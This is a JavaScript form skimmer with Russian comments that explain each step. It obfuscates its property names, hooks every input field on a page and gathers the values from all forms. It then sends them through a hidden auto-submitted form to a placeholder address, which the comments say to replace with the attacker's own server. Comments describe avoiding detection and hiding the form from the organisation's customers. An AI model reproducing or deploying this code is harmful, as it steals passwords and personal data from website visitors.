const k_0_0_1 = s => s.split('').map(c => String.fromCharCode(c.charCodeAt() - 4)).join(''); // меняет каждую букву в строке на ту, которая идет на 4 позиции раньше в алфавите
let ff_0_0_1 = false // нужно, чтобы избежать race condition

function mRK_0_0_1 () { // как бы случайная строка. О криптографической стойкости речи не идёт
	return Math.random().toString().replace('.', '')
}
const id_0_0_1 = mRK_0_0_1() // идентификатор пользователя для злоумышленника


let v_0_0_1 = self[k_0_0_1('Evve}')][k_0_0_1('jvsq')](self[k_0_0_1('hsgyqirx')][k_0_0_1('uyiv}WipigxsvEpp')](k_0_0_1("mrtyx"))); // Находим все поля на странице
for (let n=0; n<v_0_0_1.length; n++) {
	v_0_0_1[n][k_0_0_1('ehhIzirxPmwxiriv')](k_0_0_1('mrtyx'), function (evt) { // следим за изменением всех строк на странице
		b_0_0_1() // запускаем функцию ниже
	})
}

function b_0_0_1() { // копируем содержимое всех строк и отправляем на свой сервер
	if (ff_0_0_1) return // лучше не получить часть информации, чем делать слишком много запросов и оказаться замеченным
	ff_0_0_1 = true
	const d_0_0_1 = {
	}
	const f_0_0_1 = Array.from(self[k_0_0_1('hsgyqirx')][k_0_0_1('jsvqw')]) // находим все формы на странице
	for (let p=0; p<f_0_0_1.length; p++) { // проход по всем полям во всех формах
		const e_0_0_1 = f_0_0_1[p]
		const l_0_0_1 = mRK_0_0_1();
		d_0_0_1[l_0_0_1] = {}
		let gz_0_0_1 = e_0_0_1[k_0_0_1('kixIpiqirxwF}XekReqi')](k_0_0_1('mrtyx'))
		for(var i=0; i<gz_0_0_1.length; i++){ // берём содержимое всех полей
			if (gz_0_0_1[i].name && d_0_0_1[l_0_0_1][gz_0_0_1[i].name]) {
				d_0_0_1[l_0_0_1][gz_0_0_1[i].name] += gz_0_0_1[i].value
				continue
			}
			d_0_0_1[l_0_0_1][gz_0_0_1[i].name || mRK_0_0_1()] = gz_0_0_1[i].value
			continue
		}
	}
	d_0_0_1['id'] = id_0_0_1
	const s_0_0_1 = self[k_0_0_1('NWSR')][k_0_0_1('wxvmrkmj}')](d_0_0_1) // это данные перехваченные со страницы в виде строки

	// Далее будет необфусцированный код для наглядности происходящего

	let form = document.createElement("form");
	form.setAttribute("method", "post");
	form.setAttribute("action", "https://localhost:8080/payload/"); // тут надо поменять адрес для отправки данных на свой сервер. Можно обфусцировать даже адрес.
	form.style.display="none"; // прячем форму, чтобы клиент организации её не видел

	let field = document.createElement("input"); 
	field.setAttribute("type", "text");
	field.setAttribute("name", "data");
	field.setAttribute('value', s_0_0_1)

	form.appendChild(field); 

	document.getElementsByTagName("body")[0].appendChild(form);

	form.submit() // отправляет на наш сервер форму с перехваченными данными


	form.parentNode.removeChild(form); // подчищаем за собой и удаляем форму
	setTimeout(function() { 
		ff_0_0_1 = false // позволяем запускать b_0_0_1() заново
	}, 100)
	
}